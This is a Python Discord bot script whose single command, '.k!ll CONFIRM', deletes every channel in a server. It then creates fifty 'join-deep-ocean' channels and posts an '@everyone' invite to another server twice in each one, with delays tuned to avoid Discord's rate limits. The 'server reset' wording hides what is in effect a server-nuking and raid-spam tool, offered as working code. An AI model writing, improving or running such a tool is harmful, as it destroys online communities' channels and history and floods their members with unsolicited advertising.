import os
import asyncio
import discord
from discord.ext import commands

# Configuration Constants
TOKEN = os.getenv("DISCORD_TOKEN")
INVITE_LINK = "https://discord.gg/ctrhRxSKsA"
CHANNEL_NAME = "join-deep-ocean"
TARGET_COUNT = 50

# Setup Bot Intents
intents = discord.Intents.default()
intents.guilds = True
intents.message_content = True

# Command prefix set to empty string so full commands work directly
bot = commands.Bot(command_prefix="", intents=intents)


@bot.event
async def on_ready():
    print(f"========================================")
    print(f"Logged in successfully as:")
    print(f"User: {bot.user}")
    print(f"ID: {bot.user.id}")
    print(f"========================================")


@bot.command(name=".k!ll CONFIRM")
@commands.has_permissions(administrator=True)
async def kill_server(ctx):
    guild = ctx.guild
    await ctx.send("🚨 **Server reset initiated.** Deleting existing channels...")

    # Phase 1: Wipe all existing channels
    deleted_count = 0
    channel_list = list(guild.channels)
    
    for channel in channel_list:
        try:
            await channel.delete(reason="Server mass reset requested by administrator.")
            deleted_count += 1
            # Controlled delay to prevent triggering Discord API rate limits
            await asyncio.sleep(1.5)
        except discord.HTTPException as err:
            print(f"[Warning] Failed to delete channel '{channel.name}': {err}")
            await asyncio.sleep(4)

    print(f"[Info] Successfully deleted {deleted_count} channels.")

    # Phase 2: Create new channels with explicit permission overrides
    created_channels = []
    print(f"[Info] Starting creation of {TARGET_COUNT} new channels...")

    for i in range(1, TARGET_COUNT + 1):
        try:
            # Overwrite default role permissions to ensure everyone can view and write
            channel_overwrites = {
                guild.default_role: discord.PermissionOverwrite(
                    read_messages=True, 
                    send_messages=True,
                    view_channel=True
                )
            }
            
            new_channel = await guild.create_text_channel(
                name=f"{CHANNEL_NAME}-{i}",
                overwrites=channel_overwrites,
                reason="Server mass reset channel creation."
            )
            created_channels.append(new_channel)
            await asyncio.sleep(2.0)
            
        except discord.HTTPException as err:
            print(f"[Error] Failed to create channel index {i}: {err}")
            await asyncio.sleep(8.0)

    print(f"[Info] Successfully created {len(created_channels)} channels. Broadcasting messages...")

    # Phase 3: Broadcast the ping message multiple times per channel safely
    for ch in created_channels:
        try:
            # First ping broadcast with @everyone
            await ch.send(
                f"@everyone Join Deep Ocean {INVITE_LINK}",
                allowed_mentions=discord.AllowedMentions(everyone=True)
            )
            await asyncio.sleep(1.0)

            # Second ping broadcast with @everyone
            await ch.send(
                f"@everyone Join Deep Ocean {INVITE_LINK}",
                allowed_mentions=discord.AllowedMentions(everyone=True)
            )
            await asyncio.sleep(2.0)
            
        except discord.HTTPException as err:
            print(f"[Error] Failed sending broadcast in channel #{ch.name}: {err}")
            await asyncio.sleep(5.0)

    # Phase 4: Final confirmation message in the first channel
    if created_channels:
        try:
            await created_channels[0].send(
                "✅ **Server reset process completed successfully.** Join Deep Ocean."
            )
        except Exception:
            pass

    print("[Info] Server reset sequence fully completed.")


@kill_server.error
async def kill_error(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        await ctx.send("❌ You do not have the required **Administrator** permissions to use this command.")


# Run the application using the token environment variable
if __name__ == "__main__":
    if not TOKEN:
        print("[CRITICAL] DISCORD_TOKEN environment variable is not set!")
    else:
        bot.run(TOKEN)
